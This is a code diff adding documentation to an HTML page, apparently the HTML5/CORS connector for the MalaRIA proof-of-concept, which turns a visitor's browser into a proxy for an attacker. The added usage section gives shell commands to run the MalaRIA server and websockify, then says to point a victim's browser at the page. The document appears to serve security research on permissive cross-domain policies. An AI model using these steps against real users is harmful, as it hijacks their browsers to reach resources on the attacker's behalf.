@@ -20,14 +20,53 @@
     <button id=start disabled=disabled>start</button>
     <br />
     <textarea id=log cols=90 rows=10"></textarea>
+    <h2>About</h2>
+    <h3>MalaRIA</h3>
+    <p>    
+    This is the <a href="https://github.com/eoftedal/MalaRIA-Proxy">MalaRIA</a> connector.
+    MalaRIA is a proof-of-concept made by <a href="http://erlend.oftedal.no">Erlend Oftedal</a> for a proxy abusing unrestricted cross domain policies.
+    It's made of two parts: the Flash/Silverlight connector(s) launched on a victim browser, and a Java-based server. 
+    Victim visits the page with the connector, it establishes connection with server and from now on victim's browser 
+    can be used as a proxy by the attacker (Flash/Sliverlight processes the requests from the MalaRIA server and sends the responses back).
+    Attacker controls MalaRIA in his browser by simply pointing to the HTTP proxy opened by MalaRIA.  
+    </p>
+    <h3>This connector</h3>
+    <p>Originally MalaRIA demonstrated that permissive <code>crossdomain.xml</code> files are bad (because attacker can read it e.g. via the MalaRIA proxy).
+    But as I'm a HTML5 guy, I decided to create a connector compatible with my <a href="index.html">cors-proxy-browser</a>, which can use <a href="http://www.w3.org/TR/cors/">CORS</a> instead of flash.
+    To communicate with MalaRIA I use <a href="http://dev.w3.org/html5/websockets/">WebSocket</a> (because I don't have raw flash/silverlight sockets available). And that's it. Now you can use MalaRIA with only HTML5 power. 
+    </p>
+    <h2>Requirements</h2>
+    <ul>
+    <li><a href="https://github.com/koto/MalaRIA-Proxy">MalaRIA</a> (JDK to compile)</li>
+    <li><a href="https://github.com/kanaka/websockify">websockify</a> (Python and some libs to run it)</li>
+    </ul>    
+    <h2>Usage</h2>
+    <ol>
+    <li>Launch MalaRIA server and make it a WebSocket server
+    <pre>
+    $ cd MalaRIA-Proxy/proxy-backend
+    $ javac malaria/*.java
+    $ sudo java malaria.MalariaServer localhost 8081 8080 # launch malaria server with HTTP proxy on 8080 and connector proxy on 8081 
+    [2nd shell]
+    $ cd websockify
+    $ ./websockity 8082 localhost:8081 # forward WebSocket connection via TCP to MalaRIA running on 8081    
+    </pre>
+    <li>Point your victim browser to this page
+    <li>Start WebSocket connection (use websockify port 8082)
+    <li>Set HTTP proxy on attacker's browser to localhost:8080
+    <li>Use attacker browser to navigate through victim browser (usual MalaRIA stuff). URLs have to be same domain as connector or have CORS headers.
+    </ol>
+    <h2>Issues</h2>
+    <p>Alpha quality. Use with caution. Fetching binary files works most likely with Chrome only.</p>
 <script>
 var f = document.getElementById('fetcher').contentWindow;
 var p;
 
 function requestUrl(url, method) {
     log("Requesting " + url);
-    f.postMessage(JSON.stringify([ [ 'cors' ],
-                                   url, method, null ]), '*');
+    var use_methods = ['cors']; 
+    // USE ['cors', 'flash'] instead to fallback to flash
+    f.postMessage(JSON.stringify([ use_methods, url, method, null ]), '*');
 }
 
 function log(s) {
